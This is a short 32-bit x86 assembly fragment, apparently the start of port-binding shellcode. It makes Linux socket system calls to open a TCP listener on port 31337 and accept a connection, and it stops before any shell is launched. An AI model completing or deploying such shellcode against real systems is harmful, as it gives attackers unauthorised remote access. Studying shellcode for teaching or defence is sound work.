  BITS 32

  push BYTE 0x66
  pop eax
  cdq
  xor ebx, ebx
  inc ebx
  push edx
  push BYTE 0x1
  push BYTE 0x2
  mov ecx, esp
  int 0x80

  mov esi, eax

  ;; bind

  push BYTE 0x66
  pop eax
  inc ebx
  push edx
  push WORD 0x697a
  push WORD bx
  mov ecx, esp
  push BYTE 16
  push ecx
  push esi
  mov ecx, esp
  int 0x80

;;;   listen
  mov BYTE al, 0x66
  inc ebx
  inc ebx
  push ebx
  push esi
  mov ecx, esp
  int 0x80

  ;; c = accept(s, 0,0);
  mov BYTE al, 0x66
  inc ebx
  push edx
  push edx
  push esi
  mov ecx, esp
  int 0x80

  
  
